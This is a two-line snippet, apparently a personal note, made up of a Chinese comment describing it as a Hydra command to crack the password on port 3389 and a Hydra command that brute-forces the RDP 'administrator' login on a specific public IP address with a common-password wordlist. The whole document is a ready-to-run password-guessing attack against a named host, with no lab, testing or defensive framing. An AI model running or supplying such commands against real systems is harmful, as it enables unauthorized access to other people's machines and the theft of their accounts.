#hydra 破解3389端口密码命令
hydra -l administrator -P ./常用密码.txt -f -V 218.28.60.24 rdp
